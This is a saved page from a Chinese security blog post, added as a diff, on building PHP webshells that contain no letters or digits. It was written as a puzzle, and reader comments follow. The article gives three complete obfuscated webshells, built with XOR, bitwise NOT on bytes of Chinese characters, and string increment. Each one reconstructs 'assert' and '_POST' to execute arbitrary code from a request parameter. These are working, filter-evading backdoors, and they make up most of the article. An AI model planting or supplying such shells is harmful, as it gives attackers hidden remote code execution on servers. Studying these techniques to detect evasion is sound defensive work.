@@ -1,0 +1,433 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./一些不包含数字和字母的webshell  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./一些不包含数字和字母的webshell  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./一些不包含数字和字母的webshell  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>一些不包含数字和字母的webshell | 离别歌</title>
+<link href="./一些不包含数字和字母的webshell  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./一些不包含数字和字母的webshell  离别歌/styles.css" rel="stylesheet"/>
+<link href="./一些不包含数字和字母的webshell  离别歌/style.css" rel="stylesheet"/>
+<link href="./一些不包含数字和字母的webshell  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./一些不包含数字和字母的webshell  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./一些不包含数字和字母的webshell  离别歌/jquery.min.js"></script>
+<link href="./一些不包含数字和字母的webshell  离别歌/code.css" rel="stylesheet"/>
+<link href="./一些不包含数字和字母的webshell  离别歌/button.css" rel="stylesheet"/>
+<link href="./一些不包含数字和字母的webshell  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./一些不包含数字和字母的webshell  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/webshell-without-alphanum.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&amp;text=%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&amp;title=%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&amp;is_video=false&amp;description=%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/webshell-without-alphanum.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&amp;title=%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&amp;title=%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&amp;title=%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&amp;title=%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&amp;name=%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">一些不包含数字和字母的webshell</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2017年2月17日 02:44" itemprop="datePublished">
+                    2017 二月 17 02:44
+                </time>
+</div>
+<div class="article-tag">
+            阅读：5103
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7">奇技淫巧</a>,
+                
+                <a class="tag-link" href="/tag/php">php</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>在小密圈提了个问题，“如何编写一个不使用数字和字母的webshell”，并具体成如下代码：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/[a-z0-9]/is'</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'shell'</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'shell'</span><span class="p">]);</span>
+<span class="p">}</span>
+</pre></div>
+<p>那么，这个代码如何利用？</p>
+<h2 id="_1"><a class="toclink" href="#_1">思路</a></h2>
+<p>首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可。</p>
+<p>那么，<strong>变换方法</strong> 将是解决本题的要点。</p>
+<p>不过在此之前，我需要说说php5和7的差异。</p>
+<p>php5中assert是一个函数，我们可以通过<code>$f='assert';$f(...);</code>这样的方法来动态执行任意代码。</p>
+<p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p>
+<p>下文为了方便起见，使用PHP5作为环境，PHP7相关的利用方法自己探索吧。</p>
+<h2 id="_2"><a class="toclink" href="#_2">方法一</a></h2>
+<p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p>
+<p>得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$_</span><span class="o">=</span><span class="p">(</span><span class="s1">'%01'</span><span class="o">^</span><span class="s1">'`'</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">'%13'</span><span class="o">^</span><span class="s1">'`'</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">'%13'</span><span class="o">^</span><span class="s1">'`'</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">'%05'</span><span class="o">^</span><span class="s1">'`'</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">'%12'</span><span class="o">^</span><span class="s1">'`'</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">'%14'</span><span class="o">^</span><span class="s1">'`'</span><span class="p">);</span> <span class="c1">// $_='assert';</span>
+<span class="nv">$__</span><span class="o">=</span><span class="s1">'_'</span><span class="o">.</span><span class="p">(</span><span class="s1">'%0D'</span><span class="o">^</span><span class="s1">']'</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">'%2F'</span><span class="o">^</span><span class="s1">'`'</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">'%0E'</span><span class="o">^</span><span class="s1">']'</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="s1">'%09'</span><span class="o">^</span><span class="s1">']'</span><span class="p">);</span> <span class="c1">// $__='_POST';</span>
+<span class="nv">$___</span><span class="o">=</span><span class="nv">$$__</span><span class="p">;</span>
+<span class="nv">$_</span><span class="p">(</span><span class="nv">$___</span><span class="p">[</span><span class="nx">_</span><span class="p">]);</span> <span class="c1">// assert($_POST[_]);</span>
+</pre></div>
+<p>执行结果如下：</p>
+<p><a href="/media/attachment/2017/02/17/b2ac8554-37f8-448e-bc79-b7213eb2cfb8.jpg"><img alt="14871921588272.jpg" src="./一些不包含数字和字母的webshell  离别歌/b2ac8554-37f8-448e-bc79-b7213eb2cfb8.6713f3c45766.jpg"/></a></p>
+<h2 id="_3"><a class="toclink" href="#_3">方法二</a></h2>
+<p>和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。</p>
+<p>方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>'和'{2}</code>的结果是<code>"\x8c"</code>，其取反即为字母<code>s</code>：</p>
+<p><a href="/media/attachment/2017/02/17/fadccb70-4143-49df-aa47-bc9a1af93c56.jpg"><img alt="14872686600768.jpg" src="./一些不包含数字和字母的webshell  离别歌/fadccb70-4143-49df-aa47-bc9a1af93c56.97e405012da5.jpg"/></a></p>
+<p>利用这个特性，我找了一篇文章（ <a href="https://www.leavesongs.com/THINK/answer.html">https://www.leavesongs.com/THINK/answer.html</a> ），自动选择了其中一些汉字，生成如下答案：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$__</span><span class="o">=</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="o">&gt;</span><span class="s1">'&lt;'</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="o">&gt;</span><span class="s1">'&lt;'</span><span class="p">);</span>
+<span class="nv">$_</span><span class="o">=</span><span class="nv">$__</span><span class="o">/</span><span class="nv">$__</span><span class="p">;</span>
+
+<span class="nv">$____</span><span class="o">=</span><span class="s1">''</span><span class="p">;</span>
+<span class="nv">$___</span><span class="o">=</span><span class="s2">"瞰"</span><span class="p">;</span><span class="nv">$____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$_</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">"和"</span><span class="p">;</span><span class="nv">$____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$__</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">"和"</span><span class="p">;</span><span class="nv">$____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$__</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">"的"</span><span class="p">;</span><span class="nv">$____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$_</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">"半"</span><span class="p">;</span><span class="nv">$____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$_</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">"始"</span><span class="p">;</span><span class="nv">$____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$__</span><span class="p">});</span>
+
+<span class="nv">$_____</span><span class="o">=</span><span class="s1">'_'</span><span class="p">;</span><span class="nv">$___</span><span class="o">=</span><span class="s2">"俯"</span><span class="p">;</span><span class="nv">$_____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$__</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">"瞰"</span><span class="p">;</span><span class="nv">$_____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$__</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">"次"</span><span class="p">;</span><span class="nv">$_____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$_</span><span class="p">});</span><span class="nv">$___</span><span class="o">=</span><span class="s2">"站"</span><span class="p">;</span><span class="nv">$_____</span><span class="o">.=~</span><span class="p">(</span><span class="nv">$___</span><span class="p">{</span><span class="nv">$_</span><span class="p">});</span>
+
+<span class="nv">$_</span><span class="o">=</span><span class="nv">$$_____</span><span class="p">;</span>
+<span class="nv">$____</span><span class="p">(</span><span class="nv">$_</span><span class="p">[</span><span class="nv">$__</span><span class="p">]);</span>
+</pre></div>
+<p><a href="/media/attachment/2017/02/17/82b376a7-08a8-4e20-9686-553f400d280d.jpg"><img alt="14871906748025.jpg" src="./一些不包含数字和字母的webshell  离别歌/82b376a7-08a8-4e20-9686-553f400d280d.d8b4b6b1530c.jpg"/></a></p>
+<p>这个答案还利用了PHP的弱类型特性。因为要获取<code>'和'{2}</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;')==2</code>。</p>
+<h2 id="_4"><a class="toclink" href="#_4">方法三</a></h2>
+<p>那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。</p>
+<p>这就得借助PHP的一个小技巧，先看文档： <a href="http://php.net/manual/zh/language.operators.increment.php">http://php.net/manual/zh/language.operators.increment.php</a></p>
+<p><a href="/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.jpg"><img alt="14872693882387.jpg" src="./一些不包含数字和字母的webshell  离别歌/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg"/></a></p>
+<p>也就是说，<code>'a'++ =&gt; 'b'</code>，<code>'b'++ =&gt; 'c'</code>... 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p>
+<p>那么，如何拿到一个值为字符串'a'的变量呢？</p>
+<p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p>
+<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p>
+<p><a href="/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.jpg"><img alt="14872697183159.jpg" src="./一些不包含数字和字母的webshell  离别歌/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg"/></a></p>
+<p>再取这个字符串的第一个字母，就可以获得'A'了。</p>
+<p>利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$_</span><span class="o">=</span><span class="p">[];</span>
+<span class="nv">$_</span><span class="o">=@</span><span class="s2">"</span><span class="si">$_</span><span class="s2">"</span><span class="p">;</span> <span class="c1">// $_='Array';</span>
+<span class="nv">$_</span><span class="o">=</span><span class="nv">$_</span><span class="p">[</span><span class="s1">'!'</span><span class="o">==</span><span class="s1">'@'</span><span class="p">];</span> <span class="c1">// $_=$_[0];</span>
+<span class="nv">$___</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span> <span class="c1">// A</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span>
+<span class="nv">$___</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span> <span class="c1">// S</span>
+<span class="nv">$___</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span> <span class="c1">// S</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="c1">// E </span>
+<span class="nv">$___</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="c1">// R</span>
+<span class="nv">$___</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="c1">// T</span>
+<span class="nv">$___</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span>
+
+<span class="nv">$____</span><span class="o">=</span><span class="s1">'_'</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="c1">// P</span>
+<span class="nv">$____</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="c1">// O</span>
+<span class="nv">$____</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="c1">// S</span>
+<span class="nv">$____</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span>
+<span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="c1">// T</span>
+<span class="nv">$____</span><span class="o">.=</span><span class="nv">$__</span><span class="p">;</span>
+
+<span class="nv">$_</span><span class="o">=</span><span class="nv">$$____</span><span class="p">;</span>
+<span class="nv">$___</span><span class="p">(</span><span class="nv">$_</span><span class="p">[</span><span class="nx">_</span><span class="p">]);</span> <span class="c1">// ASSERT($_POST[_]);</span>
+</pre></div>
+<p>执行结果：</p>
+<p><a href="/media/attachment/2017/02/17/d92e3d40-a451-4fc4-a516-e0747b721c69.jpg"><img alt="14872701052595.jpg" src="./一些不包含数字和字母的webshell  离别歌/d92e3d40-a451-4fc4-a516-e0747b721c69.2b122097850e.jpg"/></a></p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2701">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./一些不包含数字和字母的webshell  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">test</a>
+<time datetime="2017年5月14日 23:35" itemprop="datePublished">
+                            2017 五月 14 23:35
+                        </time>
+<a href="javascript:reply_to('2701', 'test')">回复</a>
+</p>
+<p class="comment-meta">p神  请问下，上面说的 在php7中assert不能再作为函数名动态执行代码，是指不能$f='assert';$f(...);这样执行吗？ 因为我用$f='assert';$f('phpinfo()'); 在7.0.12环境下执行成功了。</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2702">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./一些不包含数字和字母的webshell  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="https://www.leavesongs.com" target="_blank">phithon</a>
+<time datetime="2017年5月14日 23:54" itemprop="datePublished">
+                            2017 五月 14 23:54
+                        </time>
+<a href="javascript:reply_to('2702', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@test 我试的可能是7.1吧，php这个也挺乱的，官网明明说assert在7里变成语言结构了，但7.0仍然能动态调用，那么为什么同为语言结构的eval不能动态调用。看文档估计找不到答案了，有兴趣的话可以研究一下源码 :)</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2678">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./一些不包含数字和字母的webshell  离别歌/21a65e04149c0907243f3d030d256d80.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">外贸</a>
+<time datetime="2017年4月28日 23:10" itemprop="datePublished">
